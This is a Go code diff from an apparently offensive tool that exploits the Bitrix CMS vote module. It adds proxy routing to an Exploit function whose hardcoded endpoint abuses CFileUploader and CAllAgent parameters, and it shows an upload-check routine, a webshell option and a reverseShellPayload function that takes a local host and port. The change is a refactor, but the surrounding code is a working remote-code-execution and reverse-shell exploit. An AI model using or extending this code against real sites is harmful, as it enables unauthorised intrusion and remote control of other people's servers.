@@ -3,20 +3,26 @@ package va
 import (
 	"bytes"
 	"fmt"
+	"github.com/indigo-sadland/quick-tricks/modules/tokens"
+	"github.com/indigo-sadland/quick-tricks/utils/colors"
+	"github.com/indigo-sadland/quick-tricks/utils/netclient"
 	"io"
 	"math/rand"
 	"net/http"
-	"github.com/indigo-sadland/quick-tricks/modules/tokens"
-	"github.com/indigo-sadland/quick-tricks/utils/colors"
 	"strings"
 	"time"
 )
 
 const endpoint = "/bitrix/tools/vote/uf.php?attachId[ENTITY_TYPE]=CFileUploader&attachId[ENTITY_ID][events][onFileIsStarted][]=CAllAgent&attachId[ENTITY_ID][events][onFileIsStarted][]=Update&attachId[MODULE_ID]=vote&action=vote"
 
-var counter int
+var (
+	counter int
+	proxy   string
+)
 
-func Exploit(target, lhost, lport, agentId string, webshell bool) error {
+func Exploit(target, lhost, lport, agentId, proxyStr string, webshell bool) error {
+	proxy = proxyStr
+	// TODO: REPLACE WITH SWITCH CASE
 	if agentId == "1" {
 		agentId = "f"
 	}
@@ -44,7 +50,7 @@ func Exploit(target, lhost, lport, agentId string, webshell bool) error {
 	if agentId == "9" {
 		agentId = "x"
 	}
-	compositeData, cookie, err := tokens.Get(target)
+	compositeData, cookie, err := tokens.Get(target, proxy)
 	if err != nil {
 		return err
 	}
@@ -55,8 +61,13 @@ func Exploit(target, lhost, lport, agentId string, webshell bool) error {
 
 	var success bool
 	var resp *http.Response
-	var client http.Client
 	var bodyReq string
+
+	client, err := netclient.NewHTTPClient(proxy)
+	if err != nil {
+		err = fmt.Errorf("Unable to parse proxy string: %s", err.Error())
+		return err
+	}
 
 	serverTime := compositeData.ServerTime
 	serverTzOffset := compositeData.ServerTzOffset
@@ -225,10 +236,15 @@ Content-Disposition: form-data; name="bxu_info[filesCount]"
 	}
 	return nil
 }
-func checkUploadedFile(uploadedFile string, randName string, webshell bool) (bool, error) {
+func checkUploadedFile(uploadedFile, randName string, webshell bool) (bool, error) {
 	var bodyReq string
-	var client http.Client
 	var resp *http.Response
+
+	client, err := netclient.NewHTTPClient(proxy)
+	if err != nil {
+		err = fmt.Errorf("Unable to parse proxy string: %s", err.Error())
+		return false, err
+	}
 
 	req, err := http.NewRequest("GET", uploadedFile, bytes.NewBuffer([]byte(bodyReq)))
 	resp, err = client.Do(req)
@@ -264,8 +280,8 @@ func randStringRunes(n int) string {
 	return string(b)
 }
 
-func reverseShellPayload(target string, localHost string, localPort string, agentId string) error {
-	compositeData, cookie, err := tokens.Get(target)
+func reverseShellPayload(target, localHost, localPort, agentId string) error {
+	compositeData, cookie, err := tokens.Get(target, proxy)
 	if err != nil {
 		return err
 	}
@@ -274,7 +290,12 @@ func reverseShellPayload(target string, localHost string, localPort string, agen
 		return err
 	}
 
-	var client http.Client
+	client, err := netclient.NewHTTPClient(proxy)
+	if err != nil {
+		err = fmt.Errorf("Unable to parse proxy string: %s", err.Error())
+		return err
+	}
+
 	var bodyReq string
 	serverTime := compositeData.ServerTime
 	serverTzOffset := compositeData.ServerTzOffset
